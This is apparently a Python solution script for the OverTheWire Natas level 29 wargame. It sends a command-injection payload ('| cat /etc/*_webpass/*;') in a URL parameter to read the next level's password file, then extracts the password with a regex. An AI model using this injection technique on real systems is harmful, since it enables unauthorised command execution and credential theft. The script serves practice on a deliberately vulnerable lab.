import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def inject_payload():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '29'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas29', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload_string = "| cat /etc/*_webpass/*;"
    payload = {'file':payload_string}
    r = requests.get('http://natas29.natas.labs.overthewire.org/', auth=auth, params=payload)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[2])

if __name__ == "__main__":
    inject_payload()
